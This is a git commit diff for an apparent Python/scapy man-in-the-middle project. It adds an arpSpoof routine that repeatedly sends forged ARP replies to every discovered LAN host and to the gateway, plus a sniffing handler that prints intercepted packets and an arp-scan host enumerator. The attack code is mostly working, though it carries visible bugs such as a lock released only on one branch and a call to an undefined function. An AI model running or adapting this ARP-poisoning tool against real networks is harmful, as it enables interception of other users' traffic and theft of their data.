7ed464fc2a57d1bfb6961e48e375d9dc1b21ce44
guykoy123 <guykoy123@gmail.com>
2017-11-19 10:28:04 +0200

    reverted previous changes

--- MITM.py
+++ MITM.py
@@ -7,9 +7,8 @@ from time import sleep
 from scapy.all import *
 from datetime import datetime
 import functions
-from network_monitor import network_monitor
-import Queue
-from multiprocessing import Process,PIPE
+#import Queue
+
 # except ImportError:
 #
 #     #TODO: handle all cases of missing modules and try to solve
@@ -25,36 +24,47 @@ addressesLock=Lock()
 def handle_Packet(pkt):
     """
     add sniffed packets to queue of prescanned packets
+    if packet is an ARP packet check if new device needs to be added to list
     send it forward
     """
     if ARP not in pkt:
-        pass
-        #TODO: decide if to do live scanning or adding to queue and then scanning
-    pass
-    #functions.sendPacket(pkt,localAddresses)
+        print pkt.show()
+        #functions.sendPacket(pkt,localAddresses)
+    else:
+        if pkt[ARP].op == 2: # is-at
+
+            address=pkt[ARP].psrc #extract IP address
+            addressesLock.acquire()
+            global localAddresses
+            if address not in localAddresses: #check for duplicates
+                localAddresses.append(address) #add IP address to list of all hosts
+                print 'added',address
+                addressesLock.release()
 
 
 
-
-
-
-def get_Local_Addresses(defaultGateway,localHost):
+def arpSpoof(router,localHost):
     """
-    scan network for all active hosts
+    every 30 seconds send ARP broadcast to spoof all machines on LAN
     """
 
-    output =functions.proc_output('arp-scan --localnet')
-    temp=output.split('\t')[:-1]
-    addrs=[]
-    for i in temp:
-        addrs.append( i.split('\n')[-1])
+    while True:
+        if len(localAddresses)>0:
+            addressesLock.acquire()
+            print 'spoofing'
+            for host in localAddresses:
+                if host != router and host != localHost: #check that ip does not match default gateway or local host to not send packets to them
 
-    global localAddresses
-    for i in range(0,len(addrs),2):
-        host=addrs[i]
-        if host != defaultGateway or host != localHost: #check if the ip is not the local host's ip or the default gateway
-            localAddresses.append(host)
-    print localAddresses
+                    victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host[0])#create arp packets
+                    gatewayPacket=Ether()/ARP(op=2,psrc=host[0],pdst=router)
+
+                    sendp(victimPacket)#send packets
+                    sendp(gatewayPacket)
+
+            addressesLock.release()
+            sleep(30)
+
+
 
 
 def setup():
@@ -69,11 +79,19 @@ def setup():
     print defaultGateway,localHost
     logging.debug('got default gateway and local IP')
 
-    get_Local_Addresses(defaultGateway,localHost) #get addresses of all hosts on network
+    global localAddresses
+    localAddresses=functions.get_Local_Addresses(defaultGateway,localHost) #get addresses of all hosts on network
     logging.debug('scanned network for all active hosts')
+    print localAddresses
 
-    #TODO: create process that will run network_monitor
-    #TODO: create PIPE to communicate with network_monitor
+    monitorThread=Thread(target=monitor_new_hosts)
+    monitorThread.start()
+    logging.debug('created thread for monitoring network for new devices')
+
+    arpThread=Thread(target=arpSpoof,args=(defaultGateway,localHost,))
+    arpThread.start()
+    logging.debug('created thread for ARP spoofing')
+
 
 
 
--- functions.py
+++ functions.py
@@ -18,12 +18,32 @@ def proc_output(command):
     (output, err) = proc.communicate()
     return output
 
+
+def get_Local_Addresses(defaultGateway,localHost):
+    """
+    scan network for all active hosts
+    and return list of all IP addresses
+    """
+
+    output =proc_output('arp-scan --localnet')
+    temp=output.split('\t')[:-1]
+    addrs=[]
+    for i in temp:
+        addrs.append( i.split('\n')[-1])
+
+    localAddresses=list()
+    for i in range(0,len(addrs),2):
+        host=addrs[i]
+        if host != defaultGateway or host != localHost: #check if the ip is not the local host's ip or the default gateway
+            localAddresses.append(host)
+    return localAddresses
+
 def getLocalhostAddress():
     """
     returns default gateway address,
     Subnet Mask
     and localhost IP address"""
-    
+
     defaultGateway=proc_output('ip route | awk \'/default/ { print $3 }\'')
     localHost=proc_output('ip route | awk \'/src/ { print $9 }\'')
     return defaultGateway,localHost
